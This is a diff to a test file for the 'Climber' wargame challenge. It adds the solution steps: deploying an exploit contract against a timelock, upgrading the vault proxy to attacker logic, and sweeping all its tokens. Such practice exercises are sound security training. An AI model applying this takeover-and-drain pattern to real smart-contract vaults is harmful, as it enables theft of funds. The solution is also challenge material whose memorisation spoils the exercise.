@@ -21,6 +21,7 @@ describe('[Challenge] Climber', function () {
         
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
+        // Logic 컨트랙트인 ClimberVault를 UUPS 패턴 및 Proxy 컨트랙트를 이용해 배포
         this.vault = await upgrades.deployProxy(
             await ethers.getContractFactory('ClimberVault', deployer),
             [ deployer.address, proposer.address, sweeper.address ],
@@ -53,6 +54,18 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        
+        // Change CimberVault's owner to attacker using vulnerability
+        let exploitContract = await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy(attacker.address, this.timelock.address, this.vault.address);
+        await exploitContract.connect(attacker).exploit();
+
+        // Upgrade to attacker's Contract
+        this.climberAttackerLogic = await ethers.getContractFactory('ClimberAttackerLogic', attacker);
+        let attacker_vault = await upgrades.upgradeProxy(this.vault.address, this.climberAttackerLogic);
+
+        // drained all tokens from vault
+        await attacker_vault.connect(attacker).sweepFunds(this.token.address);
+
     });
 
     after(async function () {
